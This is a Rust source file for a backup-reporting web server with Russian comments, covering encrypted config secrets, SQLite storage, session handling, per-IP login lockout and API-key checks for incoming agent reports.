//! Встроенный веб-сервер отчётов — работает внутри restlex-agent как отдельный Axum-listener.

use axum::{
    extract::{ConnectInfo, Form, Path, State},
    http::{header, HeaderMap, HeaderValue, StatusCode},
    response::{Html, IntoResponse, Redirect, Response},
    response::sse::{Event, KeepAlive, Sse},
    routing::{get, post},
    Json, Router,
};
use std::net::SocketAddr;
use std::convert::Infallible;
use tokio_stream::StreamExt as _;
use hmac::{Hmac, Mac};
use std::sync::{Condvar, Mutex};
use std::ops::Deref;
use percent_encoding::{utf8_percent_encode, NON_ALPHANUMERIC};
use rusqlite::{params, Connection};
use serde::{Deserialize, Serialize};
use sha2::Sha256;
use crate::i18n::{fill, t, Lang};
use std::{
    collections::{HashMap, HashSet},
    path::PathBuf,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc,
    },
    time::Duration,
};

// ── Конфиг ───────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Config {
    #[serde(default)]
    pub enabled: bool,
    #[serde(default = "default_host")]
    pub host: String,
    #[serde(default = "default_port")]
    pub port: u16,
    #[serde(default = "default_report_port")]
    pub report_port: u16,
    #[serde(default = "default_admin_user")]
    pub admin_user: String,
    #[serde(default = "default_admin_password")]
    pub admin_password: String,
    #[serde(default)]
    pub viewer_password: String,
    #[serde(default)]
    pub api_key: String,
    #[serde(default = "default_history")]
    pub history_count: usize,
    #[serde(default = "bool_true")]
    pub auto_group: bool,
    #[serde(default)]
    pub tg_token: String,
    #[serde(default)]
    pub tg_chat: String,
    #[serde(default)]
    pub tg_group: String,
    #[serde(default)]
    pub stale_hours: f64,
    #[serde(default)]
    pub secret_key: String,
    /// Логин-локаут: сколько неудачных попыток подряд с одного IP до блокировки.
    /// 0 = локаут выключен.
    #[serde(default = "default_lockout_attempts")]
    pub lockout_max_attempts: u32,
    /// На сколько минут блокируется IP (и окно подсчёта неудачных попыток).
    #[serde(default = "default_lockout_minutes")]
    pub lockout_minutes: u64,
    /// Сервер стоит за TLS-терминатором (или сам отдаёт https) — тогда на
    /// сессионную cookie вешается флаг `Secure`. По умолчанию выключено, чтобы
    /// не сломать существующие установки, работающие по plain HTTP.
    // ponytail: полноценный HTTPS на самой службе — решение владельца, здесь
    // только флаг для cookie.
    #[serde(default)]
    pub behind_tls: bool,
}

impl Default for Config {
    fn default() -> Self {
        serde_json::from_str("{}").unwrap()
    }
}

fn default_host()             -> String { "0.0.0.0".into() }
fn default_port()             -> u16    { 8798 }
fn default_report_port()      -> u16    { 8797 }
fn default_admin_user()       -> String { "admin".into() }
fn default_admin_password()   -> String { String::new() }   // пусто = fallback-входа нет
fn default_history()          -> usize  { 10 }
fn bool_true()                -> bool   { true }
fn default_lockout_attempts() -> u32    { 5 }
fn default_lockout_minutes()  -> u64    { 15 }

pub fn config_path() -> PathBuf {
    restlex_core::program_data().join("webserver-config.json")
}

/// Поля конфига, которые обязаны лежать на диске в DPAPI-виде (`enc:`).
/// ProgramData наследует DACL с чтением для Users, поэтому плейнтекст здесь =
/// api_key/токен бота/пароль админа в руках любого локального пользователя.
/// См. CLAUDE.md п.7.
fn decrypt_secrets(mut c: Config) -> Config {
    c.admin_password  = restlex_core::crypto::decrypt_secret_named(&c.admin_password, "admin_password");
    c.viewer_password = restlex_core::crypto::decrypt_secret_named(&c.viewer_password, "viewer_password");
    c.api_key         = restlex_core::crypto::decrypt_secret_named(&c.api_key, "api_key");
    c.tg_token        = restlex_core::crypto::decrypt_secret_named(&c.tg_token, "tg_token");
    warn_undecrypted(&c);
    c
}

/// DPAPI-ключ привязан к машине. Восстановление ProgramData из бэкапа на другое
/// железо, переустановка ОС или перенос сервера делают `enc:`-значения
/// нерасшифровываемыми — вход по конфигу закрывается, report-порт отдаёт 503
/// всем агентам. Причина при этом нигде не была видна, поэтому — громкий лог с
/// точным способом восстановления (см. `restlex-webserver.exe set-secret`).
fn warn_undecrypted(c: &Config) {
    let broken: Vec<&str> = [
        ("admin_password",  &c.admin_password),
        ("viewer_password", &c.viewer_password),
        ("api_key",         &c.api_key),
        ("tg_token",        &c.tg_token),
    ]
    .iter()
    .filter(|(_, v)| restlex_core::crypto::is_undecrypted(v))
    .map(|(n, _)| *n)
    .collect();
    if broken.is_empty() { return; }
    let list = broken.join(", ");
    let msg = format!(
        "КРИТИЧНО: DPAPI не смог расшифровать секреты webserver-config.json: {list}. \
         Обычная причина — конфиг перенесён с другой машины (восстановление из бэкапа, \
         переустановка ОС, смена железа): ключ DPAPI привязан к машине. \
         Пока секрет не задан заново, вход по конфигу закрыт, а порт приёма отчётов \
         отвечает 503. Восстановление БЕЗ потери остального конфига: \
         restlex-webserver.exe set-secret --name <поле> --value <значение> (для каждого из: {list}), \
         затем перезапустить службу."
    );
    tracing::error!("{msg}");
    eprintln!("[webserver] {msg}");
}

fn encrypt_secrets(c: &Config) -> Config {
    let mut e = c.clone();
    e.admin_password  = restlex_core::crypto::encrypt_secret(&e.admin_password);
    e.viewer_password = restlex_core::crypto::encrypt_secret(&e.viewer_password);
    e.api_key         = restlex_core::crypto::encrypt_secret(&e.api_key);
    e.tg_token        = restlex_core::crypto::encrypt_secret(&e.tg_token);
    e
}

pub fn load_config() -> Config {
    let p = config_path();
    match std::fs::read_to_string(&p) {
        // decrypt_secret_named возвращает значение БЕЗ префикса как есть, поэтому
        // читаются и новые `enc:`-конфиги, и старые плейнтекстовые.
        Ok(s) => match serde_json::from_str(&s) {
            Ok(c) => decrypt_secrets(c),
            Err(e) => {
                // Файл существует, но не парсится (обрыв записи, порча). НЕ сбрасываем
                // молча к дефолту, иначе tg_token/api_key/пароли "слетают" незаметно —
                // сохраняем битую копию рядом для восстановления и пишем в stderr.
                let bak = p.with_extension(format!("corrupt.{}", std::process::id()));
                let _ = std::fs::copy(&p, &bak);
                eprintln!("[webserver] config corrupt ({e}); битая копия: {}", bak.display());
                Config::default()
            }
        },
        Err(_) => Config::default(),
    }
}

/// Читает конфиг БЕЗ отката на дефолты. `Err` — файл существует, но не
/// разобрался. Нужно командам вроде `set-secret`: там запись `Config::default()`
/// поверх битого файла молча обнуляла порт, tg_chat, lockout-настройки и
/// остальные секреты — ровно в сценарии переноса/восстановления.
pub fn load_config_strict() -> anyhow::Result<Config> {
    let p = config_path();
    match std::fs::read_to_string(&p) {
        Ok(s) => serde_json::from_str::<Config>(&s)
            .map(decrypt_secrets)
            .map_err(|e| anyhow::anyhow!("{} не разобрался как JSON: {e}", p.display())),
        // Файла нет — это первый запуск, дефолты законны.
        Err(_) => Ok(Config::default()),
    }
}

pub fn save_config(cfg: &Config) -> anyhow::Result<()> {
    let p = config_path();
    if let Some(d) = p.parent() { std::fs::create_dir_all(d)?; }
    // Атомарная запись под кросс-процессным локом (GUI и служба пишут один файл).
    // std::fs::write напрямую оставлял окно с обрезанным файлом при рестарте службы
    // в момент записи — отсюда "слетевший" токен. См. CLAUDE.md п.6.
    let _lk = restlex_core::config::config_file_lock();
    // Секреты уходят на диск только в виде `enc:` (DPAPI, machine scope) —
    // тот же формат, что пишет GUI.
    restlex_core::config::write_atomic(&p, &encrypt_secrets(cfg))
        .map_err(|e| anyhow::anyhow!(e.to_string()))
}

// ── Session (контроль запуска/остановки) ─────────────────────────────────────

pub struct Session {
    pub running: AtomicBool,
    shutdown_tx: Mutex<Option<tokio::sync::watch::Sender<bool>>>,
}

impl Session {
    pub fn new() -> Arc<Self> {
        Arc::new(Self {
            running: AtomicBool::new(false),
            shutdown_tx: Mutex::new(None),
        })
    }
}

#[derive(Serialize)]
pub struct Status {
    pub running: bool,
    pub intentional_stop: bool,
    pub port: u16,
    pub enabled: bool,
}

pub fn status(session: &Arc<Session>) -> Status {
    let cfg = load_config();
    Status {
        running: session.running.load(Ordering::Relaxed),
        intentional_stop: !cfg.enabled,
        port: cfg.port,
        enabled: cfg.enabled,
    }
}

/// Снимает HANDLE_FLAG_INHERIT с сокета, чтобы дочерние процессы его не наследовали.
#[cfg(windows)]
fn make_socket_non_inheritable(listener: &tokio::net::TcpListener) {
    use std::os::windows::io::AsRawSocket;
    extern "system" {
        fn SetHandleInformation(hObject: isize, dwMask: u32, dwFlags: u32) -> i32;
    }
    unsafe { SetHandleInformation(listener.as_raw_socket() as isize, 1, 0); }
}
#[cfg(not(windows))]
fn make_socket_non_inheritable(_: &tokio::net::TcpListener) {}

/// Локальный порт из поля netstat вида `0.0.0.0:8080` / `[::]:8080`.
fn netstat_local_port(field: &str) -> Option<u16> {
    field.rsplit_once(':').and_then(|(_, p)| p.parse::<u16>().ok())
}

/// PID слушателя ТОЧНО указанного порта из строки `netstat -ano`.
/// Раньше здесь была подстрока `:{port}`, из-за чего порт 80 совпадал с 8080 и
/// служба под SYSTEM убивала чужой процесс. Теперь: только TCP, только
/// состояние LISTENING, только точное равенство номера локального порта.
fn netstat_listener_pid(line: &str, want_port: u16) -> Option<u32> {
    let f: Vec<&str> = line.split_whitespace().collect();
    // PROTO  LOCAL  FOREIGN  STATE  PID
    if f.len() < 5 || !f[0].eq_ignore_ascii_case("TCP") { return None; }
    if !f[3].eq_ignore_ascii_case("LISTENING") { return None; }
    if netstat_local_port(f[1])? != want_port { return None; }
    f[4].parse::<u32>().ok()
}

async fn bind_addr(addr: &str) -> Option<tokio::net::TcpListener> {
    if tokio::net::TcpListener::bind(addr).await.is_err() {
        let want_port = netstat_local_port(addr);
        let my_pid = std::process::id();
        if let Some(port) = want_port {
            if let Ok(out) = std::process::Command::new("netstat").args(["-ano"]).output() {
                for line in String::from_utf8_lossy(&out.stdout).lines() {
                    if let Some(pid) = netstat_listener_pid(line, port) {
                        if pid != my_pid && pid != 0 {
                            tracing::warn!("port {port} held by zombie PID {pid}, killing");
                            let _ = std::process::Command::new("taskkill")
                                .args(["/F", "/PID", &pid.to_string()])
                                .output();
                        }
                    }
                }
            }
        }
        tokio::time::sleep(Duration::from_millis(800)).await;
    }
    let sa: std::net::SocketAddr = addr.parse().ok()?;
    let sock = if sa.is_ipv4() {
        tokio::net::TcpSocket::new_v4().ok()?
    } else {
        tokio::net::TcpSocket::new_v6().ok()?
    };
    sock.set_reuseaddr(true).ok()?;
    sock.bind(sa).ok()?;
    let l = sock.listen(1024).ok()?;
    make_socket_non_inheritable(&l);
    Some(l)
}

pub fn start(session: Arc<Session>, cfg: Config) -> anyhow::Result<()> {
    if session.running.load(Ordering::Relaxed) {
        return Ok(());
    }
    let web_addr    = format!("{}:{}", cfg.host, cfg.port);
    let report_addr = format!("{}:{}", cfg.host, cfg.report_port);
    let (shutdown_tx, shutdown_rx) = tokio::sync::watch::channel(false);
    *session.shutdown_tx.lock().unwrap() = Some(shutdown_tx);
    let (sse_tx, _) = tokio::sync::broadcast::channel::<String>(128);
    let db_path = std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.join("webserver.db")))
        .unwrap_or_else(|| restlex_core::program_data().join("webserver.db"));
    init_db(&db_path)?;
    init_session_db(&db_path.with_extension("sessions.db"))?;
    init_users(&db_path, &cfg);
    let state = AppState {
        db_path: db_path.clone(),
        db_pool: DbPool::new(db_path.clone(), MAIN_DB_POOL_SIZE),
        session_pool: DbPool::new(db_path.with_extension("sessions.db"), SESSION_DB_POOL_SIZE),
        cfg: Arc::new(Mutex::new(cfg.clone())),
        sessions: Arc::new(Mutex::new(HashMap::new())),
        session_gate: Arc::new(Mutex::new(())),
        lockouts: Arc::new(Mutex::new(HashMap::new())),
        login_gate: Arc::new(tokio::sync::Semaphore::new(LOGIN_CONCURRENCY)),
        sse_tx,
    };
    // stale check background task
    tokio::spawn({
        let s = state.clone();
        async move { stale_loop(s).await }
    });

    session.running.store(true, Ordering::Relaxed);

    // Один наблюдатель за БД на сервер: изменения из любого соединения
    // видны всем открытым страницам, включая историю и админку.
    tokio::task::spawn_blocking({
        let watcher_state = state.clone();
        let tx = state.sse_tx.clone();
        let rx = shutdown_rx.clone();
        move || {
            let Ok(db) = watcher_state.db() else { return; };
            let Ok(mut version) = db.query_row("PRAGMA data_version", [], |r| r.get::<_, i64>(0)) else { return; };
            let cfg_path = config_path();
            let mut cfg_version = std::fs::metadata(&cfg_path).and_then(|m| m.modified()).ok();
            while !*rx.borrow() {
                std::thread::sleep(Duration::from_secs(1));
                if let Ok(current) = db.query_row("PRAGMA data_version", [], |r| r.get::<_, i64>(0)) {
                    let current_cfg = std::fs::metadata(&cfg_path).and_then(|m| m.modified()).ok();
                    if current != version || current_cfg != cfg_version {
                        version = current;
                        cfg_version = current_cfg;
                        let _ = tx.send(r#"{"refresh":true}"#.to_string());
                    }
                }
            }
        }
    });

    // Web listener (UI + SSE + API)
    tokio::spawn({
        let session2 = session.clone();
        let mut rx = shutdown_rx.clone();
        let app = build_web_router(state.clone());
        async move {
            match bind_addr(&web_addr).await {
                Some(listener) => {
                    tracing::info!("webui listening on {web_addr}");
                    let shutdown = async move { let _ = rx.wait_for(|&v| v).await; };
                    // into_make_service_with_connect_info — чтобы login_post мог
                    // извлечь IP клиента (ConnectInfo) для локаута.
                    let _ = axum::serve(
                        listener,
                        app.into_make_service_with_connect_info::<SocketAddr>(),
                    ).with_graceful_shutdown(shutdown).await;
                }
                None => tracing::error!("webui bind {web_addr}: failed"),
            }
            session2.running.store(false, Ordering::Relaxed);
            tracing::info!("webui остановлен");
        }
    });

    // Report listener (POST /report only)
    tokio::spawn({
        let mut rx = shutdown_rx;
        let app = build_report_router(state);
        async move {
            match bind_addr(&report_addr).await {
                Some(listener) => {
                    tracing::info!("report listener on {report_addr}");
                    let shutdown = async move { let _ = rx.wait_for(|&v| v).await; };
                    let _ = axum::serve(listener, app).with_graceful_shutdown(shutdown).await;
                }
                None => tracing::error!("report bind {report_addr}: failed"),
            }
            tracing::info!("report listener остановлен");
        }
    });

    Ok(())
}

pub fn stop(session: &Arc<Session>) {
    if let Some(tx) = session.shutdown_tx.lock().unwrap().as_ref() {
        let _ = tx.send(true);
    }
    session.running.store(false, Ordering::Relaxed);
}

// ── БД ───────────────────────────────────────────────────────────────────────

const SCHEMA: &str = "
PRAGMA journal_mode=WAL;
CREATE TABLE IF NOT EXISTS groups (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT UNIQUE NOT NULL,
    pattern TEXT DEFAULT '',
    auto_created INTEGER DEFAULT 0,
    sort_order INTEGER DEFAULT 0
);
CREATE TABLE IF NOT EXISTS reports (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    received_at TEXT NOT NULL,
    profile TEXT NOT NULL,
    pid TEXT DEFAULT '',
    status TEXT DEFAULT '',
    operation_status TEXT DEFAULT '',
    snapshot_id TEXT DEFAULT '',
    started_at TEXT DEFAULT '',
    duration_s INTEGER DEFAULT 0,
    files_new INTEGER DEFAULT 0,
    files_changed INTEGER DEFAULT 0,
    bytes_added INTEGER DEFAULT 0,
    total_bytes_processed INTEGER DEFAULT 0,
    errors TEXT DEFAULT '[]',
    source_paths TEXT DEFAULT '[]',
    dest_path TEXT DEFAULT '',
    host TEXT DEFAULT '',
    agent_version TEXT DEFAULT '',
    launcher_version TEXT DEFAULT '',
    group_id INTEGER REFERENCES groups(id) ON DELETE SET NULL
);
CREATE INDEX IF NOT EXISTS idx_reports_profile ON reports(profile);
CREATE INDEX IF NOT EXISTS idx_reports_recv    ON reports(received_at);
CREATE TABLE IF NOT EXISTS update_reports (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    received_at TEXT NOT NULL,
    component TEXT NOT NULL DEFAULT '',
    host TEXT NOT NULL DEFAULT '',
    from_version TEXT NOT NULL DEFAULT '',
    to_version TEXT NOT NULL DEFAULT '',
    success INTEGER NOT NULL DEFAULT 1,
    error TEXT DEFAULT NULL
);
CREATE INDEX IF NOT EXISTS idx_update_reports_recv ON update_reports(received_at);
CREATE TABLE IF NOT EXISTS host_info (
    host TEXT PRIMARY KEY,
    gui_version TEXT NOT NULL DEFAULT '',
    agent_version TEXT NOT NULL DEFAULT '',
    last_seen TEXT NOT NULL DEFAULT ''
);
";

fn init_db(path: &PathBuf) -> anyhow::Result<()> {
    if let Some(d) = path.parent() { std::fs::create_dir_all(d)?; }
    let conn = Connection::open(path)?;
    // Как в open_db: без таймаута занятая БД валит миграции, а их результат
    // игнорируется — колонка не появится, и вставка отчётов сломается молча.
    conn.busy_timeout(std::time::Duration::from_secs(30))?;
    conn.execute_batch(SCHEMA)?;
    conn.execute_batch(r#"
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL,
    role TEXT NOT NULL DEFAULT 'viewer',
    created_at TEXT DEFAULT (datetime('now'))
);"#)?;
    conn.execute_batch(r#"
CREATE TABLE IF NOT EXISTS update_view_state (
    username TEXT PRIMARY KEY,
    last_seen_id INTEGER NOT NULL DEFAULT 0
);
CREATE TABLE IF NOT EXISTS user_ui_state (
    username TEXT PRIMARY KEY,
    collapsed_groups TEXT NOT NULL DEFAULT '[]',
    theme TEXT NOT NULL DEFAULT 'light'
);"#)?;
    // migrations for existing DBs
    let _ = conn.execute_batch("ALTER TABLE user_ui_state ADD COLUMN theme TEXT NOT NULL DEFAULT 'light'");
    let _ = conn.execute_batch("ALTER TABLE reports ADD COLUMN files_changed INTEGER DEFAULT 0");
    let _ = conn.execute_batch("ALTER TABLE reports ADD COLUMN total_bytes_processed INTEGER DEFAULT 0");
    let _ = conn.execute_batch("ALTER TABLE reports ADD COLUMN launcher_version TEXT DEFAULT ''");
    // Circuit breaker обновлений на хосте (заполняется отчётами cb-status агента)
    let _ = conn.execute_batch("ALTER TABLE host_info ADD COLUMN update_blocked_until INTEGER DEFAULT 0");
    let _ = conn.execute_batch("ALTER TABLE host_info ADD COLUMN update_fail_count INTEGER DEFAULT 0");
    let _ = conn.execute_batch("ALTER TABLE host_info ADD COLUMN cb_reset_requested INTEGER DEFAULT 0");
    // Чистим heartbeat-строки, налипшие в reports до фикса: они рисовались на
    // странице как призрачный профиль "—" с нулевым размером.
    match conn.execute(
        "DELETE FROM reports WHERE status = 'heartbeat' OR pid = '__heartbeat__'",
        [],
    ) {
        Ok(n) if n > 0 => tracing::info!("migration: removed {n} heartbeat rows from reports"),
        Ok(_) => {}
        Err(e) => tracing::warn!("migration: heartbeat cleanup failed: {e}"),
    }
    // Backfill launcher_version from legacy composite agent_version "launcher/agent"
    let _ = conn.execute_batch(
        r#"UPDATE reports
              SET launcher_version = substr(agent_version, 1, instr(agent_version,'/')-1),
                  agent_version    = substr(agent_version, instr(agent_version,'/')+1)
            WHERE launcher_version = '' AND instr(agent_version,'/') > 0"#,
    );
    Ok(())
}

fn init_session_db(path: &PathBuf) -> anyhow::Result<()> {
    let db = open_db(path)?;
    db.execute_batch("CREATE TABLE IF NOT EXISTS web_sessions (
        token_hash TEXT PRIMARY KEY,
        username TEXT NOT NULL,
        role TEXT NOT NULL,
        csrf TEXT NOT NULL,
        created INTEGER NOT NULL,
        last_seen INTEGER NOT NULL
    );")?;
    Ok(())
}

fn init_users(path: &PathBuf, cfg: &Config) {
    let Ok(conn) = Connection::open(path) else { return };
    let count: i64 = conn.query_row("SELECT COUNT(*) FROM users", [], |r| r.get(0)).unwrap_or(0);
    if count == 0 {
        // Нерасшифрованный `enc:`-блоб НЕЛЬЗЯ хешировать как пароль: иначе любой,
        // кто прочитал webserver-config.json, входит самим шифротекстом. Раз
        // расшифровать нечем (конфиг переехал на другое железо) — не заводим
        // пользователей вовсе; лечится `set-secret --name admin_password`.
        if cfg.admin_password.is_empty() || restlex_core::crypto::is_undecrypted(&cfg.admin_password) {
            tracing::error!("init_users: admin_password не задан или не расшифрован — пользователи не созданы. Выполните: restlex-webserver.exe set-secret --name admin_password --stdin");
            return;
        }
        let admin_user = if cfg.admin_user.is_empty() { "admin" } else { &cfg.admin_user };
        let _ = conn.execute(
            "INSERT INTO users(username,password,role) VALUES(?1,?2,'admin')",
            params![admin_user, hash_password(&cfg.admin_password)],
        );
        if !cfg.viewer_password.is_empty()
            && !restlex_core::crypto::is_undecrypted(&cfg.viewer_password) {
            let _ = conn.execute(
                "INSERT INTO users(username,password,role) VALUES('viewer',?1,'viewer')",
                params![hash_password(&cfg.viewer_password)],
            );
        }
    }
}

fn open_db(path: &PathBuf) -> rusqlite::Result<Connection> {
    let conn = Connection::open(path)?;
    // busy_timeout: при одновременных записях (несколько агентов шлют /report
    // параллельно) ждать освобождения блокировки до 5с вместо мгновенного
    // "database is locked" с потерей отчёта. synchronous=NORMAL безопасен с WAL.
    conn.busy_timeout(std::time::Duration::from_secs(5))?;
    conn.execute_batch("PRAGMA journal_mode=WAL; PRAGMA synchronous=NORMAL;")?;
    Ok(conn)
}

// Ограниченный пул без дополнительных crates: rusqlite синхронен, поэтому
// checkout вызывается только из spawn_blocking или синхронных функций.
const MAIN_DB_POOL_SIZE: usize = 8;
const SESSION_DB_POOL_SIZE: usize = 4;

struct PoolInner {
    idle: Vec<Connection>,
    opened: usize,
}

struct DbPoolShared {
    path: PathBuf,
    max: usize,
    inner: Mutex<PoolInner>,
    available: Condvar,
}

#[derive(Clone)]
struct DbPool(Arc<DbPoolShared>);

struct PooledConnection {
    pool: DbPool,
    conn: Option<Connection>,
}

impl DbPool {
    fn new(path: PathBuf, max: usize) -> Self {
        assert!(max > 0);
        Self(Arc::new(DbPoolShared {
            path, max, inner: Mutex::new(PoolInner { idle: Vec::new(), opened: 0 }),
            available: Condvar::new(),
        }))
    }

    fn get(&self) -> rusqlite::Result<PooledConnection> {
        let mut inner = self.0.inner.lock().unwrap_or_else(|e| e.into_inner());
        loop {
            if let Some(conn) = inner.idle.pop() {
                return Ok(PooledConnection { pool: self.clone(), conn: Some(conn) });
            }
            if inner.opened < self.0.max {
                inner.opened += 1;
                drop(inner);
                return match open_db(&self.0.path) {
                    Ok(conn) => Ok(PooledConnection { pool: self.clone(), conn: Some(conn) }),
                    Err(e) => {
                        let mut inner = self.0.inner.lock().unwrap_or_else(|e| e.into_inner());
                        inner.opened -= 1;
                        self.0.available.notify_one();
                        Err(e)
                    }
                };
            }
            inner = self.0.available.wait(inner).unwrap_or_else(|e| e.into_inner());
        }
    }
}

impl Deref for PooledConnection {
    type Target = Connection;
    fn deref(&self) -> &Connection { self.conn.as_ref().unwrap() }
}

impl Drop for PooledConnection {
    fn drop(&mut self) {
        if let Some(conn) = self.conn.take() {
            let mut inner = self.pool.0.inner.lock().unwrap_or_else(|e| e.into_inner());
            inner.idle.push(conn);
            self.pool.0.available.notify_one();
        }
    }
}

// ── AppState ─────────────────────────────────────────────────────────────────

/// Учёт неудачных входов и блокировок по IP (in-memory; сбрасывается при
/// перезапуске службы — это и есть аварийная разблокировка).
#[derive(Clone, Default)]
struct LoginAttempt {
    fails: u32,
    last_user: String,
    first_fail: i64,   // unix-секунды первой попытки в текущем окне
    last_fail: i64,
    locked_until: i64, // 0 = не заблокирован
    locked_at: i64,    // 0 = не блокировался
}

/// Запись сессии. `last_seen` двигает скользящий TTL, `created` ограничивает
/// общий срок жизни даже при непрерывной активности.
#[derive(Clone)]
struct SessionEntry {
    role: String,
    username: String,
    csrf: String,
    created: i64,
    last_seen: i64,
}

/// Активная страница продлевает вход; повторный вход нужен после 30 дней бездействия.
const SESSION_TTL_SECS: i64 = 30 * 24 * 3600;
const SESSION_ABS_MAX_SECS: i64 = 7 * 24 * 3600;
/// Жёсткий потолок числа сессий в памяти; при переполнении вытесняются самые старые.
const MAX_SESSIONS: usize = 5000;

#[derive(Clone)]
struct AppState {
    db_path: PathBuf,
    db_pool: DbPool,
    session_pool: DbPool,
    cfg: Arc<Mutex<Config>>,
    sessions: Arc<Mutex<HashMap<String, SessionEntry>>>, // token -> сессия
    session_gate: Arc<Mutex<()>>, // сериализация SQLite restore/revoke
    lockouts: Arc<Mutex<HashMap<String, LoginAttempt>>>, // ip -> попытки/блокировка
    /// Пропускник на проверку пароля: PBKDF2 (200k итераций) — сотни мс CPU.
    /// Без него пачка неаутентифицированных POST /login забивала пул
    /// spawn_blocking и все ядра; локаут по peer-IP тут не помогает (за
    /// реверс-прокси это один IP на всех, да и конкурентную пачку он не режет).
    login_gate: Arc<tokio::sync::Semaphore>,
    sse_tx: tokio::sync::broadcast::Sender<String>,
}

/// Сколько проверок пароля выполняется одновременно.
const LOGIN_CONCURRENCY: usize = 3;

impl AppState {
    fn db(&self) -> rusqlite::Result<PooledConnection> { self.db_pool.get() }
    fn session_db_path(&self) -> PathBuf { self.db_path.with_extension("sessions.db") }
    fn session_db(&self) -> rusqlite::Result<PooledConnection> { self.session_pool.get() }
    fn cfg(&self) -> Config { self.cfg.lock().unwrap().clone() }
}

fn now_unix() -> i64 { chrono::Local::now().timestamp() }

fn fmt_unix(ts: i64) -> String {
    if ts == 0 { return "—".into(); }
    chrono::DateTime::from_timestamp(ts, 0)
        .map(|d| d.with_timezone(&chrono::Local).format("%d.%m %H:%M").to_string())
        .unwrap_or_else(|| "—".into())
}

/// Реальный IP клиента: сначала заголовки реверс-прокси, затем сокет.
fn client_ip(_headers: &HeaderMap, addr: &SocketAddr) -> String {
    // Только peer-IP TCP-сокета. X-Forwarded-For/X-Real-IP НЕ используем: сервер
    // слушает напрямую (dual-port), эти заголовки клиент подделывает произвольно,
    // и доверие к ним превращает лок-аут в решето — атакующий шлёт новый фейковый
    // IP на каждую попытку и брутфорсит пароль без блокировки.
    // ponytail: за reverse-proxy — читать XFF только из списка доверенных прокси-IP.
    addr.ip().to_string()
}

/// Возвращает остаток блокировки IP в секундах (0 — не заблокирован).
fn lock_remaining(st: &AppState, ip: &str, now: i64) -> i64 {
    let m = st.lockouts.lock().unwrap();
    m.get(ip).map(|a| (a.locked_until - now).max(0)).unwrap_or(0)
}

/// Регистрирует неудачную попытку входа и при превышении порога блокирует IP.
fn register_login_fail(st: &AppState, ip: &str, user: &str, cfg: &Config, now: i64) {
    if cfg.lockout_max_attempts == 0 { return; }
    let window = cfg.lockout_minutes.max(1) as i64 * 60;
    let mut m = st.lockouts.lock().unwrap();
    // Подчистка протухших записей, чтобы карта не росла.
    m.retain(|_, a| a.locked_until > now || now.saturating_sub(a.last_fail) <= window);
    let a = m.entry(ip.to_string()).or_default();
    // Новое окно, если прошлая попытка слишком давно или блокировка истекла.
    if a.first_fail == 0 || now.saturating_sub(a.first_fail) > window || (a.locked_until != 0 && a.locked_until <= now) {
        a.fails = 0;
        a.first_fail = now;
        a.locked_until = 0;
        a.locked_at = 0;
    }
    a.fails += 1;
    a.last_fail = now;
    a.last_user = user.chars().take(64).collect();
    if a.fails >= cfg.lockout_max_attempts {
        a.locked_until = now + window;
        a.locked_at = now;
    }
    drop(m);
    let _ = st.sse_tx.send(r#"{"refresh":true}"#.to_string());
}

// ── Router ───────────────────────────────────────────────────────────────────

fn build_web_router(state: AppState) -> Router {
    Router::new()
        .route("/favicon.ico",              get(favicon))
        .route("/events",                   get(sse_events))
        .route("/api/latest",               get(api_latest))
        .route("/login",                    get(login_get).post(login_post))
        .route("/logout",                   get(logout))
        .route("/lang/:code",               get(set_lang))
        .route("/",                         get(index))
        .route("/ui/groups/state",          post(save_group_state))
        .route("/ui/theme",                 post(save_theme))
        .route("/history/:profile",         get(history))
        .route("/updates",                  get(updates_page))
        .route("/updates/clear",            post(updates_clear))
        .route("/updates/:id/delete",       post(updates_delete))
        .route("/admin",                    get(admin_page))
        .route("/admin/settings",           post(admin_settings))
        .route("/admin/settings-autosave",  post(admin_settings_autosave))
        .route("/admin/tg-test",            post(admin_tg_test))
        .route("/admin/groups/add",         post(admin_group_add))
        .route("/admin/groups/:id/delete",  post(admin_group_delete))
        .route("/admin/profiles/:profile/delete", post(admin_profile_delete))
        .route("/admin/reports/:id/delete",       post(admin_report_delete))
        .route("/admin/users/add",          post(admin_user_add))
        .route("/admin/users/:id/delete",   post(admin_user_delete))
        .route("/admin/users/:id/password", post(admin_user_password))
        .route("/admin/users/:id/role",     post(admin_user_role))
        .route("/admin/lockouts/:ip/unlock", post(admin_lockout_unlock))
        .route("/admin/lockouts/clear",      post(admin_lockouts_clear))
        .route("/updates/cb-reset/:host",    post(updates_cb_reset))
        .layer(axum::middleware::from_fn_with_state(state.clone(), session_refresh_mw))
        .with_state(state)
}

fn build_report_router(state: AppState) -> Router {
    Router::new()
        .route("/report",        post(receive_report))
        .route("/update-report", post(receive_update_report))
        .route("/cb-status",     post(receive_cb_status))
        .route("/commands/:host", get(agent_commands))
        .with_state(state)
}

// ── Helpers ───────────────────────────────────────────────────────────────────

/// Проверка ключа для маршрутов report-порта. Fail-closed: если ключ не задан,
/// доступ закрыт — незаполненный конфиг не должен открывать сеть.
fn deny_by_api_key(cfg: &Config, headers: &HeaderMap) -> Option<Response> {
    // Нерасшифрованный `enc:`-блоб нельзя использовать как ключ: иначе тот, кто
    // прочитал конфиг, авторизуется самим шифротекстом.
    if cfg.api_key.is_empty() || restlex_core::crypto::is_undecrypted(&cfg.api_key) {
        tracing::warn!("report-port: api_key не задан/не расшифрован — запрос отклонён (fail-closed)");
        return Some((
            StatusCode::SERVICE_UNAVAILABLE,
            Json(serde_json::json!({"ok":false,"error":"api_key is not configured"})),
        ).into_response());
    }
    let provided = headers.get("x-api-key").and_then(|v| v.to_str().ok()).unwrap_or("");
    if !hmac_eq(provided.as_bytes(), cfg.api_key.as_bytes()) {
        return Some((
            StatusCode::UNAUTHORIZED,
            Json(serde_json::json!({"ok":false,"error":"unauthorized"})),
        ).into_response());
    }
    None
}

fn esc(s: &str) -> String {
    // Апостроф и '>' обязательны: значения попадают и в inline-обработчики
    // onclick="...confirm('{}')", где кавычка разрывает JS-строку.
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#39;")
}

